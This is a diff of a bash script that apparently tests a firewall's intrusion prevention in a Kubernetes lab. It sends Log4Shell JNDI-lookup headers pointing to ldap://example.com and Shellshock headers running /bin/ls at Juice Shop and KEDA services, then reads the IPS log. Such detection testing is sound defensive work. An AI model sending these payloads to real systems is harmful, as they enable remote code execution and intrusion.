@@ -15,21 +15,31 @@ run_curl_in_pod() {
     fi
 
     # Run the curl command inside the pod
-    kubectl exec $POD_NAME -- bash -c "$LOCAL_CURL_COMMAND http://$JUICE_SHOP_SVC:3000/api/Products"
+    echo kubectl exec $POD_NAME -- bash -c "$LOCAL_CURL_COMMAND $JUICE_SHOP_SVC"
+    echo waiting result
+    kubectl exec $POD_NAME -- bash -c "$LOCAL_CURL_COMMAND $JUICE_SHOP_SVC"
+    sleep 2
+    echo display log on cfos
 }
 
 # Define the Juice Shop service address in a variable
-service_address="juiceshop-service.security.svc.cluster.local"
+service_address="http://juiceshop-service.security.svc.cluster.local:3000/api/Products"
+cfos_pod_name=$(kubectl get pods -l app=firewall -o jsonpath='{.items[0].metadata.name}')
 
-# Correctly formatted payloads with added Max wait time (e.g., 30 seconds)
-payload='curl --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
+payload='curl -s --max-time 5 -H "User-Agent: \${jndi:ldap://example.com/a}"'
 run_curl_in_pod "$payload" "$service_address"
+kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/ips.0
 
-# Malicious payload with a command injection attempt, added max-time
-payload='curl --max-time 5 -H "User-Agent: {jndi:ldap://example.com/a}"'
+payload='curl -s --max-time 5 -H "User-Agent: {jndi:ldap://example.com/a}"'
 run_curl_in_pod "$payload" "$service_address"
+kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/ips.0
 
-# Another variation of a malicious payload with max-time
-payload='curl --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
+sleep 5
+payload='curl -s --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
 run_curl_in_pod "$payload" "$service_address"
+kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/ips.0
 
+service_address="https://keda-admission-webhooks.keda.svc.cluster.local:443/"
+payload='curl -k -s --max-time 5 -H "User-Agent: () { :; }; /bin/ls"'
+run_curl_in_pod "$payload" "$service_address"
+kubectl exec -it po/${cfos_pod_name} -c cfos -- tail -n -1 /var/log/log/ips.0
